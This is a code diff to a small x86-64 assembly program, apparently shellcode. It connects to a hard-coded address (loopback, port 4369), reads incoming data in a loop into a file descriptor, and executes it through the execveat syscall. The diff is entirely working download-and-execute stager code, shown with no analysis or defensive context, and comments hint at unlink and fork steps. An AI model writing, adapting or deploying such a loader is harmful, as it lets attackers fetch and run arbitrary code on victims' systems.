@@ -5,11 +5,7 @@ _start:
 #unlink
 #fork
 
-#recv -> write (loop)
-
-#execveat ("", NULL, NULL, 0x1000)
-
-# r12 = socket_fd r13 = f_fd
+sub rsp, 1024
 mov rax, 41
 mov rdi, 2
 mov rsi, 1
@@ -28,22 +24,43 @@ lea rdi, [rip + f]
 mov rsi, 1
 syscall
 mov r13, rax
+jmp read
 
+read:
+mov rax, 0
+mov rdi, r12
+mov rsi, rsp
+mov rdx, 1024
+syscall
+cmp rax, 0
+jle execute
+mov rdx, rax
+mov rax, 1
+mov rdi, r13
+mov rsi, rsp
+syscall
+jmp read
 
-
-
-
-
-
-
-
-
-
+execute:
+mov rax, 3
+mov rdi, r12
+syscall
+mov rax, 322
+mov rdi, r13
+lea rsi, [rip + f]
+inc rsi
+xor rdx, rdx
+xor r10, r10
+mov r8, 0x1000
+syscall
+add rsp, 1024
+mov rax, 60
+mov rdi, 0
+syscall
 
 addr:
 
 .quad 0x0100007f11110002
-
 
 f:
 
